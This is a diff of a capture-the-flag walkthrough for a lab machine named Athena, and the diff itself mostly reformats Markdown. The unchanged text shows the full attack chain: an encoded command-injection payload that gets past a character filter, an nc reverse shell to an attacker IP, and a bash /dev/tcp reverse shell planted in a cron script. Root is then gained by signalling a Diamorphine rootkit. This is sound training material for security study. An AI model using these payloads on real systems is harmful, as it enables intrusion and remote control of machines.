@@ -1,29 +1,29 @@
 ---
 sticker: emoji//1fab6
 ---
+# ENUMERATION
+---
 
-# ATHENA
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 | 139  | SMB     |
 | 445  | SMB     |
 
-## RECONNAISSANCE
 
-***
+
+# RECONNAISSANCE
+---
 
 We got anonymous login enabled at `smb`, let's check it out:
+
 
 ```
 smbclient -L \\\\10.10.214.108\\ -N
@@ -39,15 +39,15 @@ SMB1 disabled -- no workgroup available
 
 As we can see, we got a `public` share, let's take a look:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423162152.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423162152.png)
 
 We got a file, let's get it and view the contents:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423163005.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423163005.png)
 
 We got an endpoint, let's proceed with the web application then:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423163046.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423163046.png)
 
 Nothing weird in here, let's go to the specified route:
 
@@ -57,21 +57,22 @@ http://10.10.214.108/myrouterpanel/
 
 We can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423163143.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423163143.png)
 
 We can test some basic stuff, for example, let's try a simple ping to `127.0.0.1` to check the behavior:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423163528.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423163528.png)
+
 
 Let's begin exploitation
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 As we can see, the ping goes through, based on this, we can try some command injection payloads, let's use a basic one to check the behavior:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423163619.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423163619.png)
 
 There seems to be some blacklist surveilling which characters we put in the `ip`, we can try modifying the payloads until we get an advanced one, let's refer to our command injection notes, for example, here are a list of characters that may be helpful:
 
@@ -92,7 +93,7 @@ I tried using a payload from a previous machine on `HackTheBox`:
 ip=8.8.8.8%0Abash%09-c%09"id"%0A&submit=
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423164508.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423164508.png)
 
 There we go, it worked, let's craft a reverse shell:
 
@@ -100,17 +101,19 @@ There we go, it worked, let's craft a reverse shell:
 ip=8.8.8.8%0Abash%09-c%09"nc -c /bin/sh 10.6.34.159 9001"%0A&submit=
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423164854.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423164854.png)
 
 If we check our listener:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423164905.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423164905.png)
 
 There we go, we got our connection, let's proceed with privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
+
 
 First step is to stabilize our shell:
 
@@ -124,11 +127,11 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423165109.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423165109.png)
 
 After using linpeas, I found there is a `/usr/share/backups` directory owned by `www-data` with the group `athena`, let's take a look:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423165916.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423165916.png)
 
 We got a `backup.sh` file, let's look at the contents:
 
@@ -151,10 +154,14 @@ echo "Backup completed..."
 
 The script does the following:
 
-1. Creates a backup directory at `~/backup` (likely `/home/www-data/backup` since it's owned by `www-data`).
-2. Copies **all files** from `/home/athena/notes/*` into the backup directory.
-3. Zips the backup into `notes_backup.zip`.
-4. Deletes all `.txt` and `.sh` files in `/home/athena/backup/`.
+1. Creates a backup directory at `~/backup` (likely `/home/www-data/backup` since it's owned by `www-data`).
+    
+2. Copies **all files** from `/home/athena/notes/*` into the backup directory.
+    
+3. Zips the backup into `notes_backup.zip`.
+    
+4. Deletes all `.txt` and `.sh` files in `/home/athena/backup/`.
+    
 5. Prints a completion message.
 
 But none of this is relevant, we know that `athena` may be running this as a cronjob, we can modify the contents of the file to embed a reverse shell:
@@ -166,7 +173,7 @@ bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1' &
 
 If we start our listener a wait a little bit:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423170454.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423170454.png)
 
 We need to stabilize our shell again:
 
@@ -182,7 +189,7 @@ export BASH=bash
 
 Let's check our sudo privileges:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423170829.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423170829.png)
 
 We can run something called `venom.ko`, let's have more info of it, we can do:
 
@@ -202,11 +209,12 @@ vermagic:       5.15.0-69-generic SMP mod_unload modversions
 
 As we can see, this is a rootkit written by `m0nad`, let's use GitHub:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423171008.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423171008.png)
+
 
 This rootkit refers to something called `Diamorphine`, let's check the repo:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423171043.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423171043.png)
 
 There we go, we got our way to get into root, since we need to send a `signal 64` to become root, we can do this:
 
@@ -216,7 +224,7 @@ sleep 10 & # This will show us the pid
 kill -64 2865
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423171951.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423171951.png)
 
 If we check our id, it doesn't seem to work, this is because the signal has been modified to `57` instead of `64` on this rootkit, we can now do it again:
 
@@ -226,7 +234,7 @@ sleep 10 & # This will show us the pid
 kill -57 pid
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423174845.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423174845.png)
 
 As seen, we are root:
 
@@ -240,4 +248,5 @@ athena@routerpanel:/$ cat /home/athena/user.txt
 857c4a4fbac638afb6c7ee45eb3e1a28
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250423175116.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423175116.png)
+
